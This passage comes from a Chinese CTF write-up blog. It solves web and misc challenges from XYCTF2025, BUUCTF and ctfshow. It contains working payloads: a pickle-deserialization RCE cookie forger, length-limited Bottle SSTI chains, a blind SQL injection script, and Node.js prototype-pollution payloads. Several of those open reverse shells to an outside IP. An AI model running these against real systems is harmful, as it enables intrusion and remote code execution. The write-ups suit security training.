BaseResponse.set_cookie for details on signed cookies.        if value and value.startswith(&#x27;!&#x27;) and &#x27;?&#x27; in value:            sig, msg = map(tob, value[1:].split(&#x27;?&#x27;, 1))            hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()            if _lscmp(sig, base64.b64encode(hash)):                dst = pickle.loads(base64.b64decode(msg)) #这里用到了反序列化，看来这里就是漏洞点了                if dst and dst[0] == key:                    return dst[1]        return default    return value or default\n\n看完了这个代码好像和我想象的Pickle反序列化漏洞有点不一样，不仅没看到魔术方法，也不知道该反序列化什么，废完了\n看了一下题解才知道，Pickle反序列化原来这么厉害，我们可以自己写一个类然后进行序列化(不像PHP反序列化一样只是传递类的属性)，然后进行反序列化可以触发我们类的魔术方法\n然后一开始我还在分析set_cookie方法我该如何去伪造，但是顿时感觉有点智障了，为什么不直接调用bottle中的set_cookie方法去伪造\nfrom bottle import cookie_encodeimport ossecret = &quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;class Name:     def __reduce__(self):         return (eval, (&quot;&quot;&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /f* &gt;flag.txt&#x27;).read()&quot;&quot;&quot;,))exp = cookie_encode((&#x27;session&#x27;,&#123;&quot;name&quot;: [Name()]&#125;),secret)print(exp)\n\n我真的是有点牛逼了，我就说为什么wp都用__import__os，为什么不直接在代码前面写一个，真的是有点脑残了\n而且不知道为什么不能用set_cookie，而是要用bottle中的cookie_encode方法去加密，然后就是，是不能会显的，我们需要将输出重定向到文件中\n重定向之后我们再去download路由读取flag.txt即可\n\n\n\n\n出题人已疯题目给了附件\n# -*- encoding: utf-8 -*-&#x27;&#x27;&#x27;@File    :   app.py@Time    :   2025/03/29 15:52:17@Author  :   LamentXU &#x27;&#x27;&#x27;import bottle&#x27;&#x27;&#x27;flag in /flag&#x27;&#x27;&#x27;@bottle.route(&#x27;/&#x27;)def index():    return &#x27;Hello, World!&#x27;@bottle.route(&#x27;/attack&#x27;)def attack():    payload = bottle.request.query.get(&#x27;payload&#x27;)    if payload and len(payload) &lt; 25 and &#x27;open&#x27; not in payload and &#x27;\\\\&#x27; not in payload: #限制了长度和过滤了转义符和open        return bottle.template(&#x27;hello &#x27;+payload) #SSTI    else:        bottle.abort(400, &#x27;Invalid payload&#x27;)if __name__ == &#x27;__main__&#x27;:    bottle.run(host=&#x27;0.0.0.0&#x27;, port=5000)\n\n这个题目的重点是限制了长度导致我之前用过的payload全部都不可以用了，过滤了转义符号我不知道有什么用\n而且虽然这次的框架用的是bottle而不是flask，但是bottle模板注入的语法还简单一点就是，相当于可以直接执行python代码\n# 最基本的利用%import os; os.system(&quot;id&quot;)# 多行执行（通过换行符）%import os%os.system(&quot;cat /flag&quot;)\n\n我们注意第二个多行执行，通过换行符，我们可以实现在另外一行单独执行SSTI注入，在这个题目中需要用来绕过输出语句\n这个题目测试了一下发现好像更改了设置也支持jinja2语法可以使用&#123;&#123;7*7&#125;&#125;返回49，还好有源码，不然就会往flask那边走，在有长度限制的情况下jinja2的沙箱机制是不能使用import语句实现代码拼接的\n既然不能使用popen，那就直接使用os.system进行命令执行即可，但是如果我们直接进行注入的话发现会被输出语句作为字符串直接输出\n\n\n但是我们可以在前面加一个换行实现，但是添加了换行后才发现为什么也没输出，后面才想起来print是输出到后端，如果没有其他输出语句是不会在Http头中回显出来的，但是只要没报错就代表代码执行了\n\n\n看了大佬的题解在长度限制的情况下只能利用bottle语法没有沙箱机制的特性往模块中写入拼接命令执行代码\n%0a%import+os;os.a=&#x27;__imp&#x27;  #先是使用%0a换行绕过输出语句，然后再通过import+os;引入os库，然后往os库中写变量%0a%import+os;os.b=&#x27;ort__&#x27;%0a%import+os;os.a%2B=os.b #这里加号要URL编码估计是为了防止被作为URL中的空格识别，前面的加号倒是空格，对两个变量进行拼接\n\n我们要执行的命令大概为__import__(&quot;os&quot;).system(&quot;cat+/f*&gt;1&quot;)，至于为什么需要使用__import__而不直接使用import os，这是因为长度限制，__import__支持动态导入，也就是可以提前写到语句中执行的时候实现动态导入，但是import os必须要写入注入代码中如果执行命令\n%import+os;os.system(); #已经有23个字符了，很难完成命令执行\n\n于是思路就是先将命令执行语句拼接到变量当中然后通过exec执行命令然后通过incould包含文件即可\n%0a%import+os;os.a=&#x27;__imp&#x27;%0a%import+os;os.b=&#x27;ort__&#x27;%0a%import+os;os.a%2B=os.b%0a%import+os;os.b=&#x27;(&quot;os&quot;&#x27;%0a%import+os;os.a%2B=os.b%0a%import+os;os.b=&#x27;).sys&#x27;%0a%import+os;os.a%2B=os.b%0a%import+os;os.b=&#x27;tem(&quot;&#x27;%0a%import+os;os.a%2B=os.b%0a%import+os;os.b=&#x27;ca&#x27;%0a%import+os;os.a%2B=os.b%0a%import+os;os.b=&#x27;t+/f*&#x27;%0a%import+os;os.a%2B=os.b%0a%import+os;os.b=&#x27;&gt;1&quot;)&#x27;%0a%import+os;os.a%2B=os.b%0a%import+os;exec(os.a)%0a%include(&#x27;1&#x27;)#__import__(&quot;os&quot;).system(&quot;cat+/f*&gt;1&quot;)\n\n\n\nezsql(手动滑稽)为什么我的sql注入那么垃圾啊，明明是最开始学的漏洞，结果到现在成最不想写的题目了\n访问靶机是一个输入框，我在测试的时候就发现一个问题，不知道为什么用hakebar发送的请求头和在输入框中回显的不一样，在输入框中添加&#39;会出现报错\n\n\n但是在hakebar中发送就成了\n\n\n这就导致我一开始连报错信息都看不到，也不知道哪些字符被过滤了，导致直接放弃了，后面随手在输入框中输入了单引号才有发现，可能是在发送参数的时候对参数类型进行了绑定导致后面参数解析错误\n空格   *    union  ,   like 等\n\n\n\n然后尝试了一下发现有报错信息，但是没有回显，也就是联合注入不能用了，而且union也被过滤掉了，尝试一下报错注入发现逗号给过滤掉了，也用不了了\n我尝试使用万能密码\n1&#x27;or%091=1#\n\n\n\n问了一下DS，说这是因为bp和浏览器会对我们的进行特殊处理导致后端解析错误，我直接传递\\t的时候也会报错\nSQL 准备语句错误:You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;\\tor\\t1=1#&#x27; and password = &#x27;a&#x27;&#x27; at line 1\n\n但是我看wp脚本中使用\\t却可以，莫非真是bp和浏览器的问题，算了，做题目不要考虑那么多，什么东西能用就用哪种，用括号就可以实现万能密码\n&#x27;or(1=1)#\n\n但是返回说还需要密匙\n\n\n密匙只能在数据库里面，那就只能盲注了\n脚本和普通的布尔盲注没什么区别，但是我又发现了我之前不会的地方，就是之前都是通过逗号分隔参数使用substr提取字符的，现在逗号被过滤掉了\nimport requestsimport stringflag=&#x27;&#x27;url=&#x27;http://challenge.imxbt.cn:30820/login.php&#x27;str=string.ascii_letters+string.digits+&#x27;-_&#123;&#125;,&#x27; #获取到字母数字再添加下划线减号和大括号for i in range(1,50):    for j in str:        #or\\tsubstr((select\\tdatabase())\\tfrom\\t&#123;i&#125;\\tfor\\t1)=&#x27;&#123;j&#125;&#x27;#  testdb        #&#x27;or\\tsubstr((select\\tgroup_concat(table_name)\\tfrom\\tinformation_schema.tables\\twhere\\ttable_schema=database())\\tfrom\\t&#123;i&#125;\\tfor\\t1)=&#x27;&#123;j&#125;&#x27;#  double_checkuser        #&#x27;or\\tsubstr((select\\tgroup_concat(column_name)\\tfrom\\tinformation_schema.columns\\twhere\\ttable_name=&#x27;double_check&#x27;)\\tfrom\\t&#123;i&#125;\\tfor\\t1)=&#x27;&#123;j&#125;&#x27;#  secret        #&#x27;or\\tsubstr((select\\tsecret\\tfrom\\tdouble_check)\\tfrom\\t&#123;i&#125;\\tfor\\t1)=&#x27;&#123;j&#125;&#x27;# dtfrtkcc0czkoua9s        payload=f&quot;&#x27;or\\tsubstr((select\\tsecret\\tfrom\\tdouble_check)\\tfrom\\t&#123;i&#125;\\tfor\\t1)=&#x27;&#123;j&#125;&#x27;#&quot;        res=requests.post(url,data=&#123;&quot;username&quot;:payload,&quot;password&quot;:&#x27;123&#x27;&#125;)        #print(f&quot;发送的Payload: &#123;repr(payload)&#125;&quot;)        if &#x27;账户&#x27;in res.text:          flag+=j          print(flag)          break\n\n于是这里面使用的是from 1 for 1的语法表示从读取第一个字符，还有就是再表名那里卡了一下我拿到的是double_checkuser但没想到是double_check user两张表，然后我们拿到密钥之后即可进入下一个界面，最后的命令执行界面\n\n\n然后就是提示我们命令没有回显，然后尝试了一下sleep命令，提示我有违规字符，发现是空格，直接用$&#123;IFS&#125;绕过即可\n然后就是无回显命令执行了，我感觉做题还是得从容易的方法来，我应该先考虑重定向的，因为curl这里被过滤了，ping命令又需要DNS才方便一点，但是有一些靶场都把dnslog.cn给禁掉了，不知道为什么比赛的时候可以用，复现的时候就不可以了。\n于是直接使用重定向\ncat$&#123;IFS&#125;/f*$&#123;IFS&#125;&gt;/var/www/html/flag\n\n\n\nMisc曼波曼波曼波下载附件下来是一个包含假flag的二维码和一个txt，文件。\ntxt文件打开发现是一个base64编码而且发现等号到了最前面，猜测需要翻转，再base64解码\n直接丢给厨师长先翻转再解码出一个jpg图片\n\n\n保存下来是一张图片，进行binwalk或者formost提取出来一张图片和压缩包，还有一个txt提示压缩包密码为比赛名称和年份\n直接尝试压缩包密码为XYCTF2025，解压出来一张和刚才提取出来看着一样的图片\n\n\n如果知道那个盲水印的工具就会知道这张祖传图片，直接猜测是双图片盲水印，从github上下载Blindwatermaker\n然后输入命令\npython bwmforpy3.py decode 1.png 2.png flag.png\n\n得到flag.png\n\n\n拿到flag\nXYCTF&#123;easy_yin_xie_dfbfuj877&#125;\n\n\n\n喜欢就说出来题目附件是一个流量包，先进行一顿分析拿到几张图片，然后是一张能显示的图片和一个损毁的图片，我这才知道，原来流量包中提取的图片有一些完全没有用，那张能显示的就没有用\n使用010editor打开发现是一张png图片，然后使用tweakpng打开图片发现\n\n\n有两个IHDR头，也就是说这是由两张图片合成的，我们需要通过将这两张图片的数据块分离出来然后按照顺序拼接出图片\n具体思路就是先尝试拼接一张完整的简单图片然后剩下的数据块就是另外一张图片了，然后就是IHDR块在最前面IDAT和IEND在后面，其余的在中间，这是两张中简单图片的数据块\n\n\n 可以看到IDAT数据块中是先排满在继续排的，然后需要注意的是IDAT中也需要注意顺序，顺序对了图片才能显示完全，这张图片是不需要改变数据块顺序的，但是第二张图片要\n\n\n然后我们利用第剩余的数据块拼接第二张图片\n\n\n这个是顺序第一个IDAT数据块不对的图片，可以打开但是是不显示的\n\n\n只要IDAT数据块顺序对了图片就会逐渐显示，最后通过这个方法慢慢的将图片推出来即可\n 第二张图片的顺序为\n\n\n然后我们可以直接在第二张图片中看到一半flag\n\n\n然后就是根据提示将第一张图片进行LSB隐写，提示数字为520，我们直接传入即可\n\n\n成功拿到后一半flag\nflag&#123;WatAshl_W@_anAta_G@_t0 kubetsu_Suki!!!&#125;\n\n","tags":["Flask_session伪造","SSTI","import语句绕过长度限制","sql盲注","盲水印","png图片IDAT块拼接"]},{"title":"[b01lers2020]Life_on_Mars","url":"/2025/04/24/b01lers2020-Life-on-Mars/","content":"[b01lers2020]Life_on_Mars这个题目只是一个简单的前端界面和一堆数据，找不到什么能用的地方，而且buu还不能直接用dirsearch，我们只能尝试抓个包\n我们发现当我们随便点击一个标签的时候，有search传递标签名，另一个不知道传递什么\n\n\n响应则是前端显示的数据，但这个传参我们不抓包是看不到的\n有传参传名字，我们可以怀疑一下sql注入，看了wp事实上也是如此\n但是这个题目我想判断字段数的时候发现，为什么名字明明是字符串但是我们不需要用引号进行闭合，即使用反引号包起来也应该需要闭合，闭合了会报错，于是我们连注释符都不需要了\n我们使用order by测出有俩个字段，而且发现没什么过滤，我们直接开始联合注入\nunion select 1,database() # aliensunion select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#amazonis_planitia,arabia_terra,chryse_planitia,hellas_basin,hesperia_planum,noachis_terra,olympus_mons,tharsis_rise,utopia_basin   这里就开始不对劲了，好像和flag没什么关系#其实题解还使用了union select 1,table_name from information_schema.tables where table_schema=database()  #这样返回了 utopia_basin当前外面select语句查询的表名，我不知道这是不是玄学，反正我后面加了注释也返回这个#但是其实已经知道了，flag根本不在这里面\n\n我们第一次注入以失败告终，看来当前数据库没有flag，我们只能查询一下其他数据库\nunion select 1,group_concat(database()) from information_schema.schemata#这种写法第一次见 记下来#aliens,aliens,aliens\n\n尽然有三个名字一样的数据库，但是不应该名字不能重复吗，我见识太短浅了(但真的名字不能相同)，于是怀疑是有手脚\n看了wp，发现需要用到sqlmap去把隐藏的数据库给注出来，但是我没用过sqlmap也不会用，等下再去学\n最后的结果就是用sqlmap注入的时候发现存在一个隐藏的数据库alien_code的数据库，里面有个code表，我们使用sqlmap或者直接注入都可以\npayload\nunion select group_concat(id),group_concat(code) from alien_code.code#alien_code.code这样可以访问其他数据库中表\n\n\n\n"},{"title":"bestphp's_revenge","url":"/2025/09/07/bestphp-s-revenge/","content":"bestphp’s_revenge&lt;?phphighlight_file(__FILE__);$b = &#x27;implode&#x27;;call_user_func($_GET[&#x27;f&#x27;], $_POST);session_start();if (isset($_GET[&#x27;name&#x27;])) &#123;    $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];&#125;var_dump($_SESSION);$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);call_user_func($b, $a);?&gt;\n\n"},{"title":"[buuctf]_hashcat","url":"/2025/10/02/buuctf-hashcat/","content":"[buuctf]_hashcat一个杂项题，题目下载附件下来是一个没有类型的文件，然后使用010editor尝试发现文件头也不认识\n然后在随波逐流中尝试使用binwalk和foremost进行文件提取但是全部都失败了，然后又在binwalk文件检测的时候发现了\n\n\n发现是一个xml文件，杂项中主要是在一些word和PDF和PPTX中见到，之前做题的时候发现Word文件头和zip文件头一样，于是尝试解压得到一堆xml文件\n这里也是同理，发现有XML尝试改后缀，然后打开发现需要密码，根据题目提示使用hashcat进行爆破\n我被自己蠢到了，本来是先使用工具提取hash值的，结果就直接先去问DS\noffice2john.py 1.doc &gt; ppt_hash.txt\n\n结果显示没找到，我以为是我kali中没有，又去github上下载下来结果我发现我在前面没加python，蠢到了\n拿到我们的哈希值后就直接进行破解，我们执行命令\nhashcat.exe -a 3 -m 9500 --force hash.txt --increment --increment-min 1 --increment-max 6 ?d?d?d?d?d?d#?d?d?d?d?d?d  6位掩码攻击全是数字\n\n我们回来看一下hash.txt\n1.doc:$office$*2010*100000*128*16*265c4784621f00ddb85cc3a7227dade7*f0cc4179b2fcc2a2c5fa417566806249*b5ad5b66c0b84ba6e5d01f27ad8cffbdb409a4eddc4a87cd4dfbc46ad60160c9\n\n发现是2010年的office，于是使用参数9500，其他的参数则是攻击方式和攻击范围\n然后就是显示成功爆破的密码\nhashcat.exe -m 9500 hash.txt --show\n\n成功拿到9919\n\n\n然后尝试文件后缀，哪里无法读取不要修复，直接换后缀就行了，最后是ppt的后缀\n打开后在后面发现白色文字，直接改颜色拿到flag\n\n","tags":["hashcat爆破","PPT加密","hash提取"]},{"title":"ctfshow_nodejs","url":"/2025/07/02/ctfshow-nodejs/","content":"ctfshow_nodejs前言js代码审计太差了，想锻炼一下就去写了一下ctfshow，明天就考最后一门近代史了，千万不要挂科啊\nweb334是一个登录界面，提供了源码，下载来看\n//user.jsmodule.exports = &#123;  items: [    &#123;username: &#x27;CTFSHOW&#x27;, password: &#x27;123456&#x27;&#125;  ]&#125;;\n\n\n\n\n\n//login.jsvar express = require(&#x27;express&#x27;);var router = express.Router();var users = require(&#x27;../modules/user&#x27;).items; var findUser = function(name, password)&#123;  return users.find(function(item)&#123;    return name!==&#x27;CTFSHOW&#x27; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;  &#125;);&#125;;//一个校验函数/* GET home page. */router.post(&#x27;/&#x27;, function(req, res, next) &#123;//更目录路由 也就是登录界面  res.type(&#x27;html&#x27;);  var flag=&#x27;flag_here&#x27;;  var sess = req.session;  var user = findUser(req.body.username, req.body.password);//获取请求的两个参数使用函数进行校验   if(user)&#123;    req.session.regenerate(function(err) &#123;      if(err)&#123;        return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;&#125;);              &#125;             req.session.loginUser = user.username;      res.json(&#123;ret_code: 0, ret_msg: &#x27;登录成功&#x27;,ret_flag:flag&#125;);                  &#125;);  &#125;else&#123;    res.json(&#123;ret_code: 1, ret_msg: &#x27;账号或密码错误&#x27;&#125;);  &#125;    &#125;);module.exports = router;\n\n\nreq.body.username 和 req.body.password\nreq.body 是 Express 框架提供的请求体对象\n从客户端 POST 请求中提取的用户名和密码字段\n\n\n返回值 user\n如果找到匹配用户：返回用户对象\n如果未找到匹配用户：返回 undefined\n\n\n\n我们主要看函数\nvar findUser = function(name, password)&#123;  return users.find(function(item)&#123;    return name!==&#x27;CTFSHOW&#x27; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;  &#125;);&#125;;//这是使用了一个find方法，通过回调函数对参数进行一个校验 需要我们进行匹配\n\nitem数组中只有CTFSHOW这一个账号，但是后面有这个函数toUpperCase()，将我们传入的username进行转大写，于是我们只需要传入\nctfshow123456\n\n\n\nweb335题目提示我们/?eval，我们传入eval参数发现传参会回显\n看了题解发现源代码类似\neval(&#x27;console.log(xxx)&#x27;)\n\n我们的输入会放到console.log中去执行，就像我们bash中\necho `ls`;\n\n后端(node.js)输出到命令行然后进行命令执行，在浏览器中则是将输入输出到控制台\n我们填入的命令执行代码会被解析执行然后输出\n命令执行方式Node.js 命令执行方法对比表\n\n\n\n方法\n同步&#x2F;异步\n示例代码\n返回结果\n安全风险\n适用场景\n注意事项\n\n\n\nexecSync\n同步\nconst res = require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString();\nBuffer&#x2F;stdout\n🔴 高危\n需要立即获取结果的简单命令\n绝对禁止传入用户输入\n\n\nspawnSync\n同步\nconst res = spawnSync(&#39;ls&#39;, [&#39;-l&#39;], &#123; stdio: &#39;pipe&#39; &#125;);\n对象(stdout&#x2F;stderr)\n🟡 中危\n需要精细控制参数的命令\n参数需硬编码或严格过滤\n\n\nexec\n异步\nexec(&#39;ls&#39;, (err, stdout) =&gt; &#123; console.log(stdout); &#125;);\n回调返回stdout\n🔴 高危\n简单异步命令执行\n避免使用shell语法\n\n\nspawn\n异步\nconst ls = spawn(&#39;ls&#39;, [&#39;-l&#39;]);&lt;br&gt;ls.stdout.on(&#39;data&#39;, (d) =&gt; &#123;...&#125;);\n流式输出\n🟡 中危\n长时间运行或大数据量输出\n推荐替代exec\n\n\nfork\n异步\nconst child = fork(&#39;script.js&#39;);\nIPC通信\n🟢 低危\n多进程Node.js应用\n仅能执行Node脚本\n\n\nShellJS\n同步&#x2F;异步\nshelljs.exec(&#39;ls&#39;);\n字符串&#x2F;stdout\n🔴 高危\n需要跨平台支持的脚本\n本质仍是exec的封装\n\n\neval+命令\n同步\neval(&quot;require(&#39;child_process&#39;).execSync(&#39;ls&#39;)&quot;);\n\n\n\n\n\n\n我们可以使用这些命令执行代码，然后先解析一下\nrequire(‘child_process’).execSync(‘ls’).toString();\n require(&#39;child_process&#39;)\n\nNode.js核心模块，提供创建子进程的能力\n包含多个执行命令的方法：\nexecSync：同步执行\nexec：异步执行\nspawn：更底层的进程生成\n\n\n\n由于命令执行结果不是字符串而是二进制\nNode.js 中的 Buffer 类是用于直接处理二进制数据的特殊对象，类似于整数数组，但对应 V8 堆外的原始内存分配。\nconst &#123; execSync &#125; = require(&#x27;child_process&#x27;);const bufferOutput = execSync(&#x27;ls&#x27;); // 返回 Bufferconsole.log(bufferOutput); // 输出: &lt;Buffer 64 6f 63 75 6d 65 6e 74 73 0a&gt;\n\n.toString()\n\n将Buffer转换为UTF-8编码的字符串\n如果命令输出是文本，可正确显示结果\n\npayload\n?eval=require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString();\n\n\n\nweb336这次把exec过滤了，我们将execSync替换为spawnSync即可\n我们先来看一下spanwnSync的语法\nrequire(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;, [&#x27;-l&#x27;,&#x27;/&#x27;], &#123; stdio: &#x27;pipe&#x27; &#125;).stdout.toString();\n\n这个不像execSync直接将字符串放入shell中执行而是将命令作为参数去调用ls进行命令执行，后面的数组则是参数，后面的花括号则是Node.js的配置，我应该用不到\nstdout\n\n作用：spawnSync 方法返回一个对象，这个对象包含关于已完成进程的详细信息。.stdout 是这个对象的一个属性，它专门捕获了子进程执行命令后向标准输出（stdout） 流写入的数据。\n说明：在 Unix&#x2F;Linux 系统中，程序通常有三个标准流：\nstdin (标准输入 - 0)\nstdout (标准输出 - 1) &lt;- 这里用的就是这个\nstderr (标准错误 - 2)  cat fl001g.txt 命令会将文件内容输出到 stdout，所以这里我们用 .stdout 来获取它。\n\n\n\n?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;, [&#x27;fl001g.txt&#x27;]).stdout.toString();\n\n\n\n\n\nweb337终于可以看到源码了\nvar express = require(&#x27;express&#x27;);var router = express.Router();var crypto = require(&#x27;crypto&#x27;);function md5(s) &#123;  return crypto.createHash(&#x27;md5&#x27;)    .update(s)    .digest(&#x27;hex&#x27;);&#125;/* GET home page. */router.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;xxxxxxx&#x27;;  var a = req.query.a;  var b = req.query.b;  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;  \tres.end(flag);  &#125;else&#123;  \tres.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;);  &#125;  &#125;);module.exports = router;\n\n又到了熟悉的MD5绕过，但是这次的过滤不一样，需要a和b长度一致然后a!==b但是md5(a+flag)===md5(b+flag)，直觉的想到数组绕过，但是加密不是直接加密而是要加上flag，而且flag是不知道的也就是无法爆破。\n我们需要知道在js中传入数组是什么样的\na[]=1&amp;b[]=2\n\n得到的是\n\n\n就是一个简单的数组，然后我们再来看下拼接的结果\nconsole.log(5+[6,6]); //56,6console.log(&quot;5&quot;+6); //56console.log(&quot;5&quot;+[6,6]); //56,6console.log(&quot;5&quot;+[&quot;6&quot;,&quot;6&quot;]); //56,6\n\n可以看到，无论数组中是数字还是字符串，之间都是使用逗号隔开，然后和其他数字和字符串进行拼接\n于是思路有了，只需要a和b中值一致但是a是字符串，b为数组即可绕过\na=1&amp;b[]=1\n\n\n\nweb338终于要到面对对象代码了，也终于要到原型链污染了\n给了我们一个express框架，直接锁定路由login.js\nvar express = require(&#x27;express&#x27;);var router = express.Router();var utils = require(&#x27;../utils/common&#x27;);/* GET home page.  */router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;//body-parser是一个中间件用于返回处理数据的函数这里是json  使用json数据不会被认为__proto__为原型  res.type(&#x27;html&#x27;);  var flag=&#x27;flag_here&#x27;;  var secert = &#123;&#125;;  var sess = req.session;  let user = &#123;&#125;;  utils.copy(user,req.body);//漏洞触发点我们可以控制的对象和需要验证的对象之间进行赋值  if(secert.ctfshow===&#x27;36dboy&#x27;)&#123;    res.end(flag);  &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);    &#125;    &#125;);module.exports = router;\n\n我们再来看copy方法\nmodule.exports = &#123;  copy:copy&#125;;function copy(object1, object2)&#123;    for (let key in object2) &#123;        if (key in object2 &amp;&amp; key in object1) &#123;            copy(object1[key], object2[key])//先通过递归访问proto为键的值&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;        &#125; else &#123;            object1[key] = object2[key]//然后进行赋值 漏洞触发点 进行赋值，可以实现原型链污染        &#125;    &#125;  &#125;\n\n就是一个简单的合并数组函数，直接原型链污染\npayload\n&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;\n\n\n\n\n\nweb339我们还是直接看包含路由的login.js\nvar express = require(&#x27;express&#x27;);var router = express.Router();var utils = require(&#x27;../utils/common&#x27;);function User()&#123;  this.username=&#x27;&#x27;;  this.password=&#x27;&#x27;;&#125;function normalUser()&#123;  this.user&#125;/* GET home page.  */router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;flag_here&#x27;;  var secert = &#123;&#125;;  var sess = req.session;  let user = &#123;&#125;;  utils.copy(user,req.body);//漏洞触发点  if(secert.ctfshow===flag)&#123;//这里我们应该是不知道flag的具体内容的    res.end(flag);  &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);    &#125;    &#125;);module.exports = router;\n\n我们还是得来先看copy方法\n&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;flag_here&quot;&#125;&#125;\n\n但是我实在太天真了，怎么可能不该flag对吧，也是年轻了，我们只能继续去看其他代码\n我们来看api.js\nvar express = require(&#x27;express&#x27;);var router = express.Router();var utils = require(&#x27;../utils/common&#x27;);/* GET home page.  */router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  res.render(&#x27;api&#x27;, &#123; query: Function(query)(query)&#125;);   &#125;);module.exports = router;\n\n这里我们发现了无论是代码中还是包含的文件里都没有query这个属性，进行模板渲染的时候将query这个属性传递给模板，值为Function(query)(query)返回的内容，这个语法我实在看不懂，有可能是直接将query这个属性作为参数返回\n我们找到突破口了，但是我们该如何去改写query呢\n然后访问 api 的时候由于 query未定义，所以会向其原型找，也就是在当前代码中未定义属性的时候会向Object去寻找，这个好像有点基础，但是为什么我没有想到\n\n\n于是我们只需要通过原型链污染query属性即可通过模板注入实现rce\n但是我在尝试的时候发现不知道为什么login.js只能运行一次，也就是原型链污染只有一次的机会否则只能通过重启环境来解决，再次访问的时候直接404了\n在 utils.copy(user,req.body);打上断跟进去，堆栈一共三次 copy()\n第一次key是 &quot;__proto__&quot;；第二次key是&quot;query&quot;；第三次出错了，key是&#39;0&#39;，object变成污染后的值了，不再是键值对！，所以在经过 if (key in object2 &amp;&amp; key in object1) 判断时报错了\n还是有点看不懂，也不知道为什么键值会变，可能和query这个属性不存在有关，记住算了\n我们先通过login.js实现原型链污染\n\n\n然后我们再通过POST请求访问api路由，实现模板注入\n\n\n成功拿到flag\npayload\n&#123; &quot;__proto__&quot;:&#123; &quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /app/routes/login.js&#x27;)&quot; &#125; &#125; //直接读取文件&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/120.46.41.173/9023 0&gt;&amp;1\\&quot;&#x27;)&quot;&#125;&#125; //反弹shell\n\n\n\nweb340340和339差不多，都是通过原型链污染实现模板注入但是在login.js有点不同\nvar express = require(&#x27;express&#x27;);var router = express.Router();var utils = require(&#x27;../utils/common&#x27;);/* GET home page.  */router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;flag_here&#x27;;  var user = new function()&#123;//对象里面套了一个对象    this.userinfo = new function()&#123;    this.isVIP = false;    this.isAdmin = false;    this.isAuthor = false;         &#125;;  &#125;  utils.copy(user.userinfo,req.body);//可以看到这里使用的参数是useinfo，也就是我们需要访问两次才能访问到Object  if(user.userinfo.isAdmin)&#123;   res.end(flag);  &#125;else&#123;   return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;&#125;);    &#125;    &#125;);module.exports = router;\n\n\n\n我们还是通过json数据套两层__proto__就行了\n&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/111.11.111.11/11111 0&gt;&amp;1\\&quot;&#x27;)&quot;&#125;&#125;&#125;\n\n这个时候就需要我们重新回来看下这个copy方法\nfunction copy(object1, object2)&#123;    for (let key in object2) &#123;        if (key in object2 &amp;&amp; key in object1) &#123;            copy(object1[key], object2[key])//和之前一样通过嵌套赋值，只不过这次递归了两次        &#125; else &#123;            object1[key] = object2[key]        &#125;    &#125;  &#125;\n\n\n\n这次使用反弹shell\n\n\n\n\nweb341这次的代码和340一样，只不过少了api.js，也就是没有模板注入漏洞。其实339和340都有非预期解，就是不通过模板注入，也就是341的预期解。\nejs引擎的漏洞，虽然不知道为什么可以直接触发rce，但是考到也只有这个payload可以用吧\npayload\n&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;&#125;&#125;//直接监听发送即可\n\n这个我不知道是如何实现的，估计是express的一个cve漏洞，就记一下payload就行了\nweb342这个我没在源码中看见模板渲染的代码，然后看了题解说这里用的是jade引擎，也就是说从ejs引擎换为了jade，然后我就需要利用jade的rce漏洞吗\n只能抄下别人的payload\n&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/xx/xx 